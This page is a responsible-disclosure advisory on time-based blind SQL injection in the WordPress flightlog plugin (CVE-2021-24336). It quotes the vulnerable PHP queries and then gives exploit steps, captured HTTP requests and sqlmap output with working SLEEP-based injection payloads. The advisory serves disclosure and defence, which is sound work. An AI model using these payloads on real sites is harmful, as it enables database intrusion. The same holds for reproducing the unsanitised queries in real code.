<!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
      <title>wp-plugin : flightlog | Code Vigilant : to err is human.. To fix is Humanity</title>
    
    <link rel="stylesheet" href="/css/style.css" />
    <link rel="stylesheet" href="/css/fonts.css" />
    
  </head>

  <body>
<a href="https://codevigilant.com"><img src="/banner.png" class="header-image" width="508" height="111" alt=""  /></a>

<nav class="menu">
	<ul class="menu__list">
		<li class="menu__item">
			<a class="menu__link" href="/" >
				
				<span class="menu__text">Home</span>
				
			</a>
		</li>
		<li class="menu__item menu__dropdown">
			<a class="menu__link" href="/disclosure/">
				
				<span class="menu__text">Disclosure</span>

				
			</a>
			<input type="checkbox" id="Disclosure">
			<ul class="submenu__list">
				
					<li class="menu__item">
					<a class="menu__link" href="/category/injection/">
						
						<span class="menu__text">INJECTION</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/cross-site-scripting-xss/">
						
						<span class="menu__text">CROSS-SITE SCRIPTING (XSS)</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/information-disclosure/">
						
						<span class="menu__text">INFORMATION DISCLOSURE</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/local-file-inclusion/">
						
						<span class="menu__text">LOCAL FILE INCLUSION</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/ssrf/">
						
						<span class="menu__text">SSRF/XSPA</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/components-with-known-vulnerabilities/">
						
						<span class="menu__text">COMPONENTS WITH KNOWN VULNERABILITIES</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/unvalidated-redirects-and-forwards/">
						
						<span class="menu__text">UNVALIDATED REDIRECTS AND FORWARDS</span>
						
					</a>
					</li>
				
			</ul>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/blog/" >
				
				<span class="menu__text">Blog</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/feed.xml" >
				
				<span class="menu__text">RSS Feed</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/about-team/" >
				
				<span class="menu__text">About Team</span>
				
			</a>
		</li>
	</ul>
</nav>



<main>
	<br />
<center><a href=""><span class="title">Wp Plugin Flightlog</span></a></center>

<h3><u>Plugin Details</u></h3><div>Plugin Name: <a href="https://wordpress.org/plugins/flightlog/" rel="noreferrer noopener nofollow" target="_blank">wp-plugin : flightlog</a></div>
<div>Effected Version : 3.0.2 (and most probably lower version's if any)</div>
<div>Vulnerability : <a href="/category/injection/">Injection</a></div>
<div>Minimum Level of Access Required : Editor</div>
<div>CVE Number : CVE-2021-24336</div>
<div>Identified by : <a href="/author/shreya_pohekar/">Shreya Pohekar</a></div>
<div><a href="https://wpscan.com/plugin/flightlog/" rel="noreferrer noopener nofollow" target="_blank">WPScan Reference URL</a></div>
 
<h3><u>Disclosure Timeline</u></h3>
<ul>
	<li>

<div>April 19, 2021: Issue Identified and Disclosed to WPScan</div>

	</li>
	
	<li>
	April 19, 2021 : Plugin  Closed</li>
	
	
	<li>May 17, 2021 : CVE Assigned</li>
	
	<li>May 19, 2021 : Public Disclosure</li>
</ul>



<h3><u>Technical Details</u></h3>

<p>Multiple vulnerable parameters were identified affected by time based blind SQL Injection in flightlog plugin.</p>
<p>Vulnerable File: <code>flightlog/flightlog.php</code></p>
<p>Vulnerable Code block and parameter:</p>
<ol>
<li>Editor level SQLi for parameter <code>from</code> <a href="https://plugins.trac.wordpress.org/browser/flightlog/trunk/flightlog.php#L520" target="_blank" rel="noreferrer noopener nofollow">flightlog.php#L520</a>
</li>
</ol>
<pre><code>520: $results1 = $wpdb-&gt;get_results('SELECT lat, lng FROM ' . $wpdb-&gt;prefix . 'flightlog_airports WHERE id=' . $_POST[&quot;from&quot;]);
</code></pre><ol start="2">
<li>Editor Level SQLi for parameter <code>to</code> <a href="https://plugins.trac.wordpress.org/browser/flightlog/trunk/flightlog.php#L527" target="_blank" rel="noreferrer noopener nofollow">flightlog.php#L527</a>
</li>
</ol>
<pre><code>527: $results2 = $wpdb-&gt;get_results('SELECT lat, lng FROM ' . $wpdb-&gt;prefix . 'flightlog_airports WHERE id=' . $_POST[&quot;to&quot;]);
</code></pre><ol start="3">
<li>Admin level SQLi for parameter <code>id</code> <a href="https://plugins.trac.wordpress.org/browser/flightlog/trunk/flightlog.php#L302" target="_blank" rel="noreferrer noopener nofollow">flightlog.php#L302</a>
</li>
</ol>
<pre><code>302: $results = $wpdb-&gt;get_results('SELECT * FROM ' . $wpdb-&gt;prefix . 'flightlog_' . $section . ' WHERE id=' . $_POST[&quot;id&quot;]);
</code></pre><ol start="4">
<li>Unreachable injection point however if the item in number 3 is fixed this can still cause SQL Injection. parameter <code>id</code> <a href="https://plugins.trac.wordpress.org/browser/flightlog/trunk/flightlog.php#L316" target="_blank" rel="noreferrer noopener nofollow">flightlog.php#L316</a>
</li>
</ol>
<pre><code>316: $results = $wpdb-&gt;get_results('SELECT ff.id, fa1.lat AS lat1, fa1.lng AS lng1, fa2.lat AS lat2, fa2.lng AS lng2 FROM ' . $wpdb-&gt;prefix . 'flightlog_flights ff JOIN '.$wpdb-&gt;prefix.'flightlog_airports fa1 ON fa1.id=ff.airport_from JOIN '.$wpdb-&gt;prefix.'flightlog_airports fa2 ON fa2.id=ff.airport_to WHERE fa1.id=' . $_POST[&quot;id&quot;] . ' OR fa2.id=' . $_POST[&quot;id&quot;]);
</code></pre><ol start="5">
<li>Editor level SQL Injection for parameter <code>flight_id</code> <a href="https://plugins.trac.wordpress.org/browser/flightlog/trunk/flightlog.php#L546" target="_blank" rel="noreferrer noopener nofollow">flightlog.php#L546</a>
</li>
</ol>
<pre><code>546: $results_rem = $wpdb-&gt;get_results(&quot;SELECT flight_id FROM &quot; . $wpdb-&gt;prefix . &quot;flightlog_flights_remarks WHERE flight_id=&quot; . $_POST['flight_id']);
</code></pre><p>SQL Injection Type: Blind Time based SQL Injection</p>
<h4 id="poc-screenshot">PoC Screenshot:</h4>
<ol>
<li><code>to</code> and <code>from</code> parameters (Editor Level)</li>
</ol>
<p><img src="/disclosure_screenshots/flightlog_poc1_2.jpg" alt="PoC Screenshot"></p>
<ol start="2">
<li><code>id</code> parameter vulnerable (Admin Level)</li>
</ol>
<p><img src="/disclosure_screenshots/flightlog_poc3.jpg" alt="PoC Screenshot"></p>
<ol start="3">
<li><code>flight_id</code> parameter vulnerable (Editor Level)</li>
</ol>
<p><img src="/disclosure_screenshots/flightlog_poc4.jpg" alt="PoC Screenshot"></p>
<h4 id="exploit">Exploit</h4>
<ol>
<li>
<p><code>to</code> and <code>from</code> parameters (Editor Level)</p>
<p>a. After installation, go to tools and click flightlog</p>
<p>b. Add a record</p>
<p>c. POST parameter <code>to</code> and <code>from</code> are vulnerable to AND time-based blind SQL injection</p>
</li>
</ol>
<p><strong>Vulnerable Request</strong></p>
<pre><code>POST http://172.28.128.50/wp-admin/tools.php?page=flightlog-entries-menu HTTP/1.1
Proxy-Connection: keep-alive
Content-Length: 116
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Origin: http://172.28.128.50
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-GPC: 1
Referer: http://172.28.128.50/wp-admin/tools.php?page=flightlog-entries-menu
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: wordpress_232395f24f6cff47569f2739c21385d6=editor%7C1618784241%7CEIPCnFe0Z1pqsXlQU1BkDsR8puOcuHIjo8JWfkemAnE%7Cd0b55585df7e1ebe010bd8d538c2fb980a7de84be97380993e5d037ef43e5d5a; wordpress_test_cookie=WP%20Cookie%20check; tk_ai=woo%3A8bv%2FYCyGDyRrTTfoyEtt3v9r; PHPSESSID=39fb60f8461711922fbba5740e25022e; wordpress_logged_in_232395f24f6cff47569f2739c21385d6=editor%7C1618784241%7CEIPCnFe0Z1pqsXlQU1BkDsR8puOcuHIjo8JWfkemAnE%7Cb7d501125207de32404cd5b81e38d4d1ca5cffeda24e7fa0979ab843b072d521; wp-settings-time-2=1618611826
Host: 172.28.128.50

section=flight&amp;dt=&amp;from=1&amp;to=1&amp;carrier=1&amp;aircraft=1&amp;ifr_vfr=0&amp;day_night=0&amp;approaches=&amp;landings=&amp;plane_id=&amp;Submit=Add
</code></pre><p><strong>SQLMap Output</strong></p>
<pre><code>sqlmap identified the following injection point(s) with a total of 467 HTTP(s) requests:
---
Parameter: to (POST)
    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: section=flight&amp;dt=&amp;from=1&amp;to=1 AND (SELECT 1824 FROM (SELECT(SLEEP(5)))Eims)&amp;carrier=1&amp;aircraft=1&amp;ifr_vfr=0&amp;day_night=0&amp;approaches=&amp;landings=&amp;plane_id=&amp;Submit=Add

Parameter: from (POST)
    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: section=flight&amp;dt=&amp;from=1 AND (SELECT 9760 FROM (SELECT(SLEEP(5)))zCHx)&amp;to=1&amp;carrier=1&amp;aircraft=1&amp;ifr_vfr=0&amp;day_night=0&amp;approaches=&amp;landings=&amp;plane_id=&amp;Submit=Add
---
</code></pre><ol start="2">
<li>
<p><code>id</code> parameter vulnerable (Admin Level)</p>
<p>a. Go to settings and click Flighlog.</p>
<p>b. Add an airport.</p>
<p>c. Update the airport and intercept the request with burp.</p>
<p>d. POST parameter <code>id</code> is vulnerable to time-based blind sqli</p>
</li>
</ol>
<p><strong>Vulnerable Request</strong></p>
<pre><code>POST http://172.28.128.50/wp-admin/options-general.php?page=flightlog-settings-menu HTTP/1.1
Proxy-Connection: keep-alive
Content-Length: 84
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Origin: http://172.28.128.50
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-GPC: 1
Referer: http://172.28.128.50/wp-admin/options-general.php?page=flightlog-settings-menu
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: wordpress_232395f24f6cff47569f2739c21385d6=admin%7C1618785857%7CLqV6XnEQtqBfao4p87KO3hj9fwkwplFmvPidCq3c6yK%7C963f01bcf9d95967aee8c280f136e5b955fa9aa5b12f9f5403848844ffd0c05f; wordpress_test_cookie=WP%20Cookie%20check; tk_ai=woo%3A8bv%2FYCyGDyRrTTfoyEtt3v9r; PHPSESSID=39fb60f8461711922fbba5740e25022e; wordpress_logged_in_232395f24f6cff47569f2739c21385d6=admin%7C1618785857%7CLqV6XnEQtqBfao4p87KO3hj9fwkwplFmvPidCq3c6yK%7C385448f321c0bf6524b5ca0a7f83fd05a0fd964636089909dabc72000b7e6f66; wp-settings-1=libraryContent%3Dbrowse; wp-settings-time-1=1618613057
Host: 172.28.128.50

section=airports&amp;id=2&amp;name=a&amp;iata=BHO&amp;lat=0.0000000&amp;lng=0.0000000&amp;Submit=Update
</code></pre><p><strong>SQLMap Output</strong></p>
<pre><code>Parameter: id (POST)
    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: section=airports&amp;id=2 AND (SELECT 1421 FROM (SELECT(SLEEP(5)))GfMZ)&amp;name=bhopal&amp;iata=BHO&amp;lat=0.0000000&amp;lng=0.0000000&amp;Submit=Update
</code></pre><ol start="3">
<li>
<p><code>flight_id</code> parameter vulnerable (Editor Level)</p>
<p>a. Login as editor</p>
<p>b. Go to tools and click flightlog</p>
<p>c. Edit a flight log entry and add a remark and intercept the request with burp.</p>
<p>d. POST parameter <code>flight_id</code> is vulnerable to time-based blind sqli.</p>
</li>
</ol>
<p><strong>Vulnerable Request</strong></p>
<pre><code>POST http://172.28.128.50/wp-admin/tools.php?page=flightlog-entries-menu HTTP/1.1
Proxy-Connection: keep-alive
Content-Length: 52
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Origin: http://172.28.128.50
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-GPC: 1
Referer: http://172.28.128.50/wp-admin/tools.php?page=flightlog-entries-menu
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: wordpress_232395f24f6cff47569f2739c21385d6=editor%7C1618786846%7CkUuWiXfNEdS0PXWQ2y3S7W7TWF31ZqU9uPy8wyN5AbU%7C1e866f6dac7e45562047db6d3465e2c55d1f3d394361f728cbf6e6a71aa529b5; wordpress_test_cookie=WP%20Cookie%20check; tk_ai=woo%3A8bv%2FYCyGDyRrTTfoyEtt3v9r; PHPSESSID=39fb60f8461711922fbba5740e25022e; wordpress_logged_in_232395f24f6cff47569f2739c21385d6=editor%7C1618786846%7CkUuWiXfNEdS0PXWQ2y3S7W7TWF31ZqU9uPy8wyN5AbU%7C81950261599bb6adf7d71e6aee6ecdaf9263d51223e338de32782c68ac2d3cd4; wp-settings-time-2=1618614048
Host: 172.28.128.50

flight_id=3045&amp;section=rem&amp;remark=Test&amp;Submit=Update
</code></pre><p><strong>SQLMap Output</strong></p>
<pre><code>Parameter: flight_id (POST)
    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: flight_id=3045 AND (SELECT 1932 FROM (SELECT(SLEEP(5)))XEdw)&amp;section=rem&amp;remark=Test&amp;Submit=Update
</code></pre>

<br />


</main>

  <footer>
  
  
  <hr/>
  © <a href="https://anantshri.info">Anant Shrivastava</a> 2021
  
  </footer>
  </body>
</html>

